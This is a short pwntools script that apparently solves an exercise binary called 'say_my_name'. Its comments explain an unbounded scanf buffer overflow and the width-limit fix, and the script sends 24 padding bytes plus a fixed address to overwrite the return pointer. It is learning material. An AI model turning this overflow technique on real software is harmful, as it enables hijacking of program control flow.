#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF("./say_my_name", checksec=False)
context.log_level = "error"

#
# The scanf function in welcomeMe() is not limited
# As the name char is 20 bytes long (data) and the old pointer is 4 bytes
# we just print 20 A chars followed by 4 chars to create a overflow on the buffer
# the next step is to add the hex version of our wanted function pointer 
# So the return pointer is overwritten by this one
#
# scanf provides the function to limit the chars to read with scanf("%19s", str1)
# so in this example the function just reads 19 chars
#


def start(argv=[], *a, **kw):
    gdbscript = """
    tbreak main
    continue
    """.format(
        **locals()
    )

    if args.GDB:
        context.log_level = "debug"
        context.terminal = ["tmux", "split", "-h"]
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# you can also create new functions here

def main():
    io = start()

    io.recvuntil(b"Please enter your name:")
    input = b'AAAAAAAAAAAAAAAAAAAAAAAA' + b'\xa0\x91\x04\x08'
    io.sendline(input)
    answer = (io.recvall())
    answer = answer[38:60]
    print(answer.decode("utf-8"))

if __name__ == "__main__":
    main()
